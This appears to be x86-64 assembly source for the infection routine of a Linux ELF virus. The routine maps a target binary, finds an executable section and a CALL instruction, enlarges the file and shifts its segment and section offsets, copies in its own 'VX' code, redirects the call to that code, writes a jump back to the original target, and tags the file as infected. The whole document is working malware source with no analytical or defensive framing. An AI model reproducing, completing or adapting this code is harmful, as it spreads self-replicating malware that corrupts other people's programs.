;//////////////////////////////////////////////////////////////////////////////////////////////////
;// [ MMAP ]  ; mmap(pFileHandle, cFileSize) rsi = pFileHandle, rax = cFileSize
;//////////////////////////////////////////////////////////////////////////////////////////////////
MMAP:       push           rbp
              mov          rbp,             rsp    
              
              ;/////////////////////////////////////////////////////////////////

              sub          rsp,             cMMAPVq           ; size for local variable

              mov   qword [rbp - FHandle],  rsi               ; save FileHandle
              mov   qword [rbp - FSize],    rax               ; save FileSize

              ;/////////////////////////////////////////////////////////////////
              ;// File Mapping
              ;/////////////////////////////////////////////////////////////////

              xor          rdi,             rdi               ; addr
              mov          rsi,      qword [rbp - FSize]      ; size
              add          rsi,             MYSIZE
              mov          rdx,             PROT_RW           ; protection
              mov          r10,             MAP_SHARED        ; flags
              mov          r8,       qword [rbp - FHandle]    ; file handle
              xor          r9,              r9                ; offset
              mov          rax,             SYS_MMAP
              syscall
              
              cmp          rax,             0x00
              jl           MMAP_ERROR

              mov   qword [rbp - pMFile],   rax               ; save pMemoryFile

              ;/////////////////////////////////////////////////////////////////
              ;// Find Section with SHF_EXECINSTR Flag
              ;/////////////////////////////////////////////////////////////////
              
              mov          rax,      qword [rbp - pMFile]     ; pMemoryFile

              mov          rbx,      qword [rax + 0x28]       ; rbx == pSectionHeader
              add          rbx,             rax
              
              xor          rdx,             rdx
              mov           dx,       word [rax + 0x3A]       ; rdx == cSectionHeader
              
              xor          rcx,             rcx
              mov           cx,       word [rax + 0x3C]       ; rcx == nSectionHeader

SECLOOP:      mov          rax,      qword [rbx + 0x08]       ; SectionFlag
              and          rax,             SHF_EXECINSTR
              
              cmp          rax,             SHF_EXECINSTR
              jne          NOEXEC
              
              cmp   qword [rbx + 0x20],     0x40              ; too small
              jl           NOEXEC
              
              cmp   qword [rbx + 0x38],     0x00              ; table
              jne          NOEXEC
              
              mov   qword [rbp - pSection], rbx               ; save pSection
              mov   qword [rbp - nSection], rcx               ; save nSection (reverse offset)
              
              jmp          FSEC                               ; found Section

NOEXEC:       add          rbx,             rdx               ; next Section
              dec          rcx
              cmp          rcx,             0x00
              jne          SECLOOP
              
              jmp          UNMAP                              ; found no Section
              
FSEC:         ;/////////////////////////////////////////////////////////////////
              ;// Find Call Command [E8:XXXX]
              ;/////////////////////////////////////////////////////////////////

              mov          r8,       qword [rbp - pMFile]
              add          r8,       qword [rbx + 0x18]       ; Address in File
              mov          r9,       qword [rbx + 0x20]       ; Size in File
              
              xor          r10,             r10

FINDCALL:     cmp    byte [r8 + r10],       0xE8                   
              jne          NEXTC

              xor          rax,             rax
              mov          eax,      dword [r8 + r10 + 1]
              
              cmp          eax,             0x00
              jl           NEXTC

              cmp          eax,             0x0AFF
              jg           NEXTC

              mov   qword [rbp - cCall],    rax               ; save cCall
              
              mov          rax,             r8
              add          rax,             r10

              mov   qword [rbp - pCall],    rax               ; save pCall

              jmp          FCALL                              ; found Call  
              
NEXTC:        inc          r10
              dec          r9
              cmp          r9,              0x00
              jne          FINDCALL
              
              jmp          UNMAP                              ; found no Call

FCALL:        ;/////////////////////////////////////////////////////////////////
              ;// Change File Size
              ;/////////////////////////////////////////////////////////////////

              mov          rdi,      qword [rbp - FHandle]    ; file handle
              mov          rsi,      qword [rbp - FSize]      ; file size
              add          rsi,             MYSIZE
              mov          rax,             SYS_FTRUNCATE
              syscall
              cmp          rax,             0x00
              jl           MMAP_ERROR
              
RSEC:         ;/////////////////////////////////////////////////////////////////
              ;// find Segment which contain our VX - Code
              ;/////////////////////////////////////////////////////////////////

              mov          rbx,      qword [rbp - pSection]
              mov          r8,       qword [rbx + 0x10]       ; Address in Memory
              add          r8,       qword [rbx + 0x20]       ; + Size in File
              
              mov          rax,      qword [rbp - pMFile]     ; pMemoryFile
              mov          rbx,      qword [rax + 0x20]       ; rbx == pProgramHeader
              add          rbx,             rax

              xor          rdx,             rdx
              mov          dx,        word [rax + 0x36]       ; rdx == cProgramHeader
              
              xor          rcx,             rcx
              mov          cx,        word [rax + 0x38]       ; rcx == nProgramHeader
              
SEGLOOP:      cmp          r8,       qword [rbx + 0x10] 
              jl           NOTLOAD
              
              mov          rax,      qword [rbx + 0x10]       ; Address in Memory
              add          rax,      qword [rbx + 0x28]       ; + Size in Memory
              
              cmp          r8,              rax
              jg           NOTLOAD
              
              mov          r11,             rcx
              mov   qword [rbp - pSegment], rbx               ; save Segment
              
              mov          rax,      qword [rbx + 0x20]       ; Size in File
              add          rax,             MYSIZE
              mov   qword [rbx + 0x20],     rax
              
              mov          rax,      qword [rbx + 0x28]       ; Size in Memory
              add          rax,             MYSIZE
              mov   qword [rbx + 0x28],     rax
              
              jmp          FSEGMENT
              
NOTLOAD:      add          rbx,             rdx               ; next Segment
              dec          rcx
              cmp          rcx,             0x00
              jne          SEGLOOP

FSEGMENT:     ;/////////////////////////////////////////////////////////////////
              ;// Move Segments after our VX - Code
              ;/////////////////////////////////////////////////////////////////

              mov          rbx,      qword [rbp - pSegment]
              mov          r8,       qword [rbx + 0x08]       ; Address in File
              add          r8,       qword [rbx + 0x20]       ; Size in File
              sub          r8,              MYSIZE

              mov          rax,      qword [rbp - pMFile]     ; pMemoryFile
              mov          rbx,      qword [rax + 0x20]       ; rbx == pProgramHeader
              add          rbx,             rax

              xor          rdx,             rdx
              mov          dx,        word [rax + 0x36]       ; rdx == cProgramHeader
              
              xor          rcx,             rcx
              mov          cx,        word [rax + 0x38]       ; rcx == nProgramHeader

SEGLOOP2:     cmp          rcx,             r11               ; check if our Segment
              je           NOTLOAD2

              cmp          r8,       qword [rbx + 0x08]       ; Address in File
              jg           NOTLOAD2
              
              mov          rax,      qword [rbx + 0x08]       ; Address in File
              add          rax,             MYSIZE
              mov   qword [rbx + 0x08],     rax
              
NOTLOAD2:     add          rbx,             rdx               ; next Segment
              dec          rcx
              cmp          rcx,             0x00
              jne          SEGLOOP2

              ;/////////////////////////////////////////////////////////////////
              ;// Make Space for VX - Code 
              ;/////////////////////////////////////////////////////////////////

              mov          rbx,      qword [rbp - pSegment]
              mov          r13,      qword [rbx + 0x08]       ; Address in File
              add          r13,      qword [rbx + 0x20]       ; Size in File
              sub          r13,             MYSIZE

              mov          rsi,      qword [rbp - pMFile]
              add          rsi,             r13       

              mov          rdi,             rsi
              add          rdi,             MYSIZE

              mov          rcx,      qword [rbp - pMFile]
              add          rcx,      qword [rbp - FSize]
              sub          rcx,             rdi

NEXTB:        dec          rcx
              mov          al,        byte [rsi + rcx]
              mov    byte [rdi + rcx],      al
              cmp          rcx,             0x00
              jne          NEXTB

              ;/////////////////////////////////////////////////////////////////
              ;// change pSectionHeader
              ;/////////////////////////////////////////////////////////////////

              mov          rbx,      qword [rbp - pMFile]     ; pMemoryFile
              mov          rax,      qword [rbx + 0x28]       ; rbx == pSectionHeader
              
              add          rax,             MYSIZE
              mov   qword [rbx + 0x28],     rax               ; New pSectionHeader
              
              mov          rax,      qword [rbp - pSection]
              add          rax,             MYSIZE
              mov   qword [rbp - pSection], rax

              ;/////////////////////////////////////////////////////////////////
              ;// Change Sections after Section with VX - Code
              ;/////////////////////////////////////////////////////////////////

              mov          rbx,      qword [rbp - pSegment]
              mov          r13,      qword [rbx + 0x08]       ; Address in File
              add          r13,      qword [rbx + 0x20]       ; Size in File
              sub          r13,             MYSIZE

              mov          rax,      qword [rbp - pMFile]     ; pMemoryFile

              mov          rbx,      qword [rax + 0x28]       ; rbx == pSectionHeader
              add          rbx,             rax
              
              xor          rdx,             rdx
              mov          dx,        word [rax + 0x3A]       ; rdx == cSectionHeader
              
              xor          rcx,             rcx
              mov          cx,        word [rax + 0x3C]       ; rcx == nSectionHeader

SECLOOP2:     cmp          r13,      qword [rbx + 0x18]       ; Address in File
              jg           NEXTSEC2
              
              mov          rax,      qword [rbx + 0x18]       ; Address in File
              add          rax,             MYSIZE
              mov   qword [rbx + 0x18],     rax

NEXTSEC2:     add          rbx,             rdx
              dec          rcx
              cmp          rcx,             0x00
              jne          SECLOOP2
              
              ;/////////////////////////////////////////////////////////////////
              ;// Change Call Command [E8:XXXX] -> VX
              ;/////////////////////////////////////////////////////////////////

              mov          rbx,      qword [rbp - pSegment]
              mov          r13,      qword [rbx + 0x08]       ; Address in File
              add          r13,      qword [rbx + 0x20]       ; Size in File
              sub          r13,             MYSIZE
              
              add          r13,      qword [rbp - pMFile]
              
              sub          r13,      qword [rbp - pCall]
              sub          r13,             0x05
              
              mov          rax,      qword [rbp - pCall]
              mov   dword [rax + 1],        r13d
              
              ;/////////////////////////////////////////////////////////////////
              ;// Calculate Back Jump
              ;/////////////////////////////////////////////////////////////////

              sub          r13,      qword [rbp - cCall]
              add          r13,             0x04
              add          r13,             SINJECT
              not          r13
              
              ;/////////////////////////////////////////////////////////////////
              ;// Write Back Jump
              ;/////////////////////////////////////////////////////////////////

              call         BASE2
BASE2:        pop          rbx
              sub          rbx,             BASE2             ; rbx == DELTA  

              sub          rdi,             MYSIZE          
              xor          rdx,             rdx
              lea          rsi,            [rbx + Main_2_GEN]
              
COPYN:        mov          al,        byte [rsi + rdx]
              mov    byte [rdi + rdx],      al
              inc          rdx
              cmp          rdx,             SINJECT
              jne          COPYN
              
              mov    byte [rdi + rdx],      0xE9              ; jmp
              mov   dword [rdi + rdx + 1],  r13d

              ;/////////////////////////////////////////////////////////////////
              ;// [TAG]
              ;/////////////////////////////////////////////////////////////////

              mov          rax,      qword [rbp - pMFile]
              mov    word [rax + 0x09],     0x170A
              
              ;/////////////////////////////////////////////////////////////////
              ;// Write to File
              ;/////////////////////////////////////////////////////////////////
              
W2FILE:       mov          rdi,      qword [rbp - pMFile]
              mov          rsi,      qword [rbp - FSize]
              mov          rdx,             MS_SYNC | MS_INVALIDATE
              mov          rax,             SYS_MSYNC
              syscall

              cmp          rax,             0x00
              jl           MMAP_ERROR

              ;/////////////////////////////////////////////////////////////////
              ;// UnMapping
              ;/////////////////////////////////////////////////////////////////

UNMAP:        mov          rdi,      qword [rbp - pMFile]
              mov          rsi,      qword [rbp - FSize]
              mov          rax,             SYS_UNMAP
              syscall

              xor          rax,             rax
              jmp          MMAP_READY
              
              ;/////////////////////////////////////////////////////////////////

MMAP_ERROR:   mov          rax,             0x01

              ;/////////////////////////////////////////////////////////////////
              
MMAP_READY:   mov          rsp,             rbp
            pop            rbp
              ret
